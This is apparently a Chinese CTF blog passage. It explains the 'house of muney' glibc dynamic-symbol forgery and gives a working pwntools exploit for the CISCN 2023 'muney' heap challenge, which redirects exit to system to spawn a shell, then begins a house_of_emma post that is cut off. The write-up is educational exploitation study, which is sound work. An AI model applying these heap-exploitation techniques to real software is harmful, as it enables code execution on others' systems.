class="hljs-built_in">list</span>[i]-&gt;l_real;<br><br>      <span class="hljs-comment">/* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span> == skip)<br><span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Don&#x27;t search the executable when resolving a copy reloc.  */</span><br>      <span class="hljs-keyword">if</span> ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_type == lt_executable)<br><span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Do not look into objects which are going to be removed.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_removed)<br><span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Print some debugging info if wanted.  */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))<br>_dl_debug_printf (<span class="hljs-string">&quot;symbol=%s;  lookup in file=%s [%lu]\n&quot;</span>,<br>  undef_name, DSO_FILENAME (<span class="hljs-built_in">map</span>-&gt;l_name),<br>  <span class="hljs-built_in">map</span>-&gt;l_ns);<br><br>      <span class="hljs-comment">/* If the hash table is empty there is nothing to do here.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_nbuckets == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">continue</span>;<br><br>      Elf_Symndx symidx;<br>      <span class="hljs-type">int</span> num_versions = <span class="hljs-number">0</span>;<br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *versioned_sym = <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-comment">/* The tables for this map.  */</span><br>      <span class="hljs-comment">// 找到符号表和字符串表（当前link_map）</span><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_SYMTAB]);<br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_STRTAB]);<br><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym;<br>      <span class="hljs-comment">// 获取bitmask</span><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Addr)</span> *bitmask = <span class="hljs-built_in">map</span>-&gt;l_gnu_bitmask;<br>      <span class="hljs-keyword">if</span> (__glibc_likely (bitmask != <span class="hljs-literal">NULL</span>))<br>&#123;<br>      <span class="hljs-comment">// 获取bitmask_word，这里需要伪造</span><br>  ElfW(Addr) bitmask_word<br>    = bitmask[(new_hash / __ELF_NATIVE_CLASS)<br>      &amp; <span class="hljs-built_in">map</span>-&gt;l_gnu_bitmask_idxbits];<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="hljs-number">1</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="hljs-built_in">map</span>-&gt;l_gnu_shift)<br>   &amp; (__ELF_NATIVE_CLASS - <span class="hljs-number">1</span>));<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1)<br>&amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="hljs-number">1</span>))<br>    &#123;<br>          <span class="hljs-comment">// 获取bucket，这里需要伪造</span><br>      Elf32_Word bucket = <span class="hljs-built_in">map</span>-&gt;l_gnu_buckets[new_hash<br>     % <span class="hljs-built_in">map</span>-&gt;l_nbuckets];<br>      <span class="hljs-keyword">if</span> (bucket != <span class="hljs-number">0</span>)<br>&#123;<br>          <span class="hljs-comment">// hasharr，这里也需要伪造对应的值</span><br>  <span class="hljs-type">const</span> Elf32_Word *hasharr = &amp;<span class="hljs-built_in">map</span>-&gt;l_gnu_chain_zero[bucket];<br><br>  <span class="hljs-keyword">do</span><br>    <span class="hljs-title function_">if</span> <span class="hljs-params">(((*hasharr ^ new_hash) &gt;&gt; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)</span><br>      &#123;<br>symidx = ELF_MACHINE_HASH_SYMIDX (<span class="hljs-built_in">map</span>, hasharr);<br>sym = check_match (undef_name, ref, version, flags,<br>   type_class, &amp;symtab[symidx], symidx,<br>   strtab, <span class="hljs-built_in">map</span>, &amp;versioned_sym,<br>   &amp;num_versions);<br><span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span>)<br>  <span class="hljs-keyword">goto</span> found_it;<br>      &#125;<br>  <span class="hljs-keyword">while</span> ((*hasharr++ &amp; <span class="hljs-number">1u</span>) == <span class="hljs-number">0</span>);<br>&#125;<br>    &#125;<br>          <span class="hljs-comment">//....</span><br>  &#125;<br></code></pre></td></tr></table></figure><p><strong>这里是roderick师傅做了注释之后的代码，上面标注了我们需要伪造的值</strong></p><ol><li><strong>bitmask_word</strong></li><li><strong>bucket</strong></li><li><strong>hasharr</strong></li></ol><p><strong>还有两个比较重要的值就是set_name 和set_value，前半部分是通过查找该函数符号和strtab之间的偏移得到的，不同的程序得到的不同，而set_vaule是通过相应的libc环境编译而来的的对于需求函数，这里也是通过调试获得，简而言之，如果控制了<code>set_name </code>就可以正确解析到相应的函数名，控制了<code>set_vaule</code>就可以控制调用函数解析到需求函数的地址进而调用需求函数。</strong></p><p><strong>在2023年的CISCN有一道题目</strong></p><p><strong>muney</strong></p><p><strong>保护策略</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008210347892-1068838240.png" alt="img"></strong></p><p><strong>ida逆向分析</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008210533465-107616031.png" alt="img"></strong></p><p><strong>是一个堆题，前提是需要实验http格式发送相应选项，让web手给说个形式</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008210630785-1670921104.png" alt="img"></strong></p><p><strong>比如使用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,content_length,content</span>):<br>    payload=<span class="hljs-string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Offset: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(offset).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length).encode()+<span class="hljs-string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br></code></pre></td></tr></table></figure><p><strong>来定义edit函数，其余的以此类推</strong></p><p><strong>这题的漏洞主要在edit函数，只限制不能超过申请堆块大小，但是没有限制长度为负数，也是就可以修改到低地址处的内容，比如可以修改堆块size</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008211015877-1316564914.png" alt="img"></strong></p><p><strong>此外这题的malloc函数给的范围在0xFFFFF以上及申请0x100000大小的堆块以上，那么意味着申请的堆块由mmp直接分配，那么会在libc上面mmp出一块内存</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008211323413-819499018.png" alt="img"></strong></p><p><strong>给的后门是exit(&#x2F;bin&#x2F;sh)</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241008211403813-1820987043.png" alt="img"></strong></p><p><strong>如果给exit解析成system即可拿到shell</strong></p><p><strong>这里就需要伪造libc里面的一系列上面提到的内容</strong></p><p><strong>这里给出调试脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./muney&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;127.0.0.1&quot;,&quot;9999&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content_length,content</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /create HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Size: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(size)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length)+<span class="hljs-string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,content_length,content</span>):<br>    payload=<span class="hljs-string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Offset: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(offset).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length).encode()+<span class="hljs-string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /delete HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /quit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> payload<br>gdb.attach(p)<br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,quit())<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这里需要源码级的调试，在事先导入源码目录</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009181944247-1670551721.png" alt="img"></strong></p><p><strong>push n …… 进入 _dl_runtime_resolve</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182201844-1749150943.png" alt="img"></strong></p><p><strong>继续步入进入_dl_fixup</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182305126-1445116192.png" alt="img"></strong></p><p><strong>在这里先空走一轮while循环，因为这里看的是第二次解析的地址</strong></p><p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182428355-426809747.png" alt="img"></p><p><strong>这里看一下bitmask_word 的内容</strong></p><p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182611789-194531855.png" alt="img"></p><p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182714287-1333394139.png" alt="img"></p><p><strong>继续往后走，这里看一下bucket 的内容</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182754029-1445708882.png" alt="img"></strong></p><p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009182828547-1948811624.png" alt="img"></p><p><strong>然后看一下hasharr的内容</strong></p><p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009183057264-1232943883.png" alt="img"></p><p><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009183148046-2051995952.png" alt="img"></p><p><strong>因为环境是20.04环境，我这里使用20.04虚拟机来找偏移</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009214617372-1605166769.png" alt="img"></strong></p><p><strong>这里0x46a40是exit的set_vuale set_name需要找一下strtab和exit字符串的偏移</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009215213550-304357691.png" alt="img"></strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009215220605-1011567680.png" alt="img"></strong></p><p><strong>这里需要尝试，找到哪一个才是真正的偏移。然后需要找一下同环境下的system的set_vuale</strong></p><p><strong>写一个程序验证一下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br><span class="hljs-built_in">int</span> main()&#123;<br>char *buff;<br>read(<span class="hljs-number">0</span>,buff,<span class="hljs-number">0x20</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>需要开启延迟绑定，然后关闭pie保护</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009215943672-335769811.png" alt="img"></strong></p><p><strong>找到发现是0x52290</strong></p><p><strong>那么现在该有的都有，只需要找一下偏移即可</strong></p><p><strong>这里要注意，实际的偏移和输入的偏移相差0x1000，因为在起始地址时候减少了0x1000</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241009222548326-1993525860.png" alt="img"></strong></p><p><strong>所以这里要输入0x152b78，以此类推</strong></p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br><span class="hljs-comment">#p = process(&quot;./muney&quot;)</span><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;9999&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content_length,content</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /create HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Size: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(size)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length)+<span class="hljs-string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,content_length,content</span>):<br>    payload=<span class="hljs-string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Offset: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(offset).encode()+<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(content_length).encode()+<span class="hljs-string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content<br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /delete HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    payload=<span class="hljs-string">&quot;&quot;&quot;POST /quit HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:8888</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Idx: &quot;&quot;&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> payload<br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="hljs-number">0x150000</span>,<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span>))<br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,-<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;\x02\x10\x17&#x27;</span>))<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,delete(<span class="hljs-number">0</span>))<br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="hljs-number">0x171002</span>,<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">16</span>))<br><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x152b78</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0xf010028c0201130e</span>)))<span class="hljs-comment">#write data to bitmask_word</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x152ca0</span>,<span class="hljs-number">1</span>,p8(<span class="hljs-number">0x86</span>)))<span class="hljs-comment">#write data to bucket</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x153d6c</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0x7c967e3e7c93f2a0</span>)))<span class="hljs-comment">#write data to hasharr</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x8</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&quot;\x90\x22\x05&quot;</span>))<span class="hljs-comment">#write data to exit@st_value</span><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&quot;\xbd\xa1\x1a&quot;</span>))<span class="hljs-comment">#write data to exit@st_name</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x10</span>+<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&quot;\x12&quot;</span>))<span class="hljs-comment">#write data to exit@st_name</span><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x156d18</span>-<span class="hljs-number">0x10</span>+<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&quot;\x0f&quot;</span>))<span class="hljs-comment">#write data to exit@st_name</span><br><br><br>p.sendafter(<span class="hljs-string">&quot;HTTP_Parser&gt; &quot;</span>,quit())<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这里面有几个点需要注意，第一个是bitmask_word的内容做了一点改变，用看见的内容不行，用这个也许0xaaa101010210130e也就是后4位需要注意。</strong></p><p><strong>还有一个就是set_name这个后面4位是需要调试出来的，第四位和第六位程序里面里面得到</strong></p><p><strong>result</strong></p><p><strong><img src="/2024/10/10/house-of-muney-CISCN/3419447-20241010001032702-1654813537.png" alt="img"></strong></p><p><strong>参考</strong></p><p><strong><a href="https://www.cnblogs.com/LynneHuan/p/17822130.html">https://www.cnblogs.com/LynneHuan/p/17822130.html</a></strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常回家看看之house_of_emma</title>
    <link href="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/"/>
    <url>/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/</url>
    
    <content type="html"><![CDATA[<h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house_of_emma"></a><strong>house_of_emma</strong></h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a><strong>前言：</strong></h3><p><strong>相比较于house_of_kiwi（<a href="https://www.cnblogs.com/CH13hh/p/18405448">house_of_kiwi</a>），house_of_emma的手法更加刁钻，而且威力更大，条件比较宽松，只需要lagebin_attack即可完成。</strong></p><p><strong>当然把两着放到一起是因为它们都利用了__malloc_assest来刷新IO流，不同的是，house_of_kiwi是通过修改调用函数的指针，还有修改rdx（_IO_heaper_jumps）的偏移达到目的的，条件需要两次任意地址写，相对来说比较苛刻，然后house_of_emma则是利用了vtable地址的合法性，在符合vtable的地方找到了一个函数_IO_cookie_read，这个函数存在_IO_cookie_jumps中，可以看一下。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p _IO_cookie_jumps<br>$<span class="hljs-number">1</span> = &#123;<br>  __dummy = <span class="hljs-number">0</span>,<br>  __dummy2 = <span class="hljs-number">0</span>,<br>  __finish = <span class="hljs-number">0x7bc53c683dc0</span> &lt;_IO_new_file_finish&gt;,<br>  __overflow = <span class="hljs-number">0x7bc53c684790</span> &lt;_IO_new_file_overflow&gt;,<br>  __underflow = <span class="hljs-number">0x7bc53c684480</span> &lt;_IO_new_file_underflow&gt;,<br>  __uflow = <span class="hljs-number">0x7bc53c685560</span> &lt;__GI__IO_default_uflow&gt;,<br>  __pbackfail = <span class="hljs-number">0x7bc53c686640</span> &lt;__GI__IO_default_pbackfail&gt;,<br>  __xsputn = <span class="hljs-number">0x7bc53c6839b0</span> &lt;_IO_new_file_xsputn&gt;,<br>  __xsgetn = <span class="hljs-number">0x7bc53c685740</span> &lt;__GI__IO_default_xsgetn&gt;,<br>  __seekoff = <span class="hljs-number">0x7bc53c678ae0</span> &lt;_IO_cookie_seekoff&gt;,<br>  __seekpos = <span class="hljs-number">0x7bc53c685900</span> &lt;_IO_default_seekpos&gt;,<br>  __setbuf = <span class="hljs-number">0x7bc53c6826d0</span> &lt;_IO_new_file_setbuf&gt;,<br>  __sync = <span class="hljs-number">0x7bc53c682560</span> &lt;_IO_new_file_sync&gt;,<br>  __doallocate = <span class="hljs-number">0x7bc53c677ef0</span> &lt;__GI__IO_file_doallocate&gt;,<br>  __read = <span class="hljs-number">0x7bc53c6789c0</span> &lt;_IO_cookie_read&gt;,<br>  __write = <span class="hljs-number">0x7bc53c6789f0</span> &lt;_IO_cookie_write&gt;,<br>  __seek = <span class="hljs-number">0x7bc53c678a40</span> &lt;_IO_cookie_seek&gt;,<br>  __close = <span class="hljs-number">0x7bc53c678aa0</span> &lt;_IO_cookie_close&gt;,<br>  __stat = <span class="hljs-number">0x7bc53c6867a0</span> &lt;_IO_default_stat&gt;,<br>  __showmanyc = <span class="hljs-number">0x7bc53c6867d0</span> &lt;_IO_default_showmanyc&gt;,<br>  __imbue = <span class="hljs-number">0x7bc53c6867e0</span> &lt;_IO_default_imbue&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可以看见它位于_IO_cookie_jumps+0x38+0x38的位置，至于为什么不写_IO_cookie_jumps+0x70，这样为了方便后面理解。</strong></p><p><strong>我们看看_IO_cookie_read都做了什么</strong></p><figure class="highlight 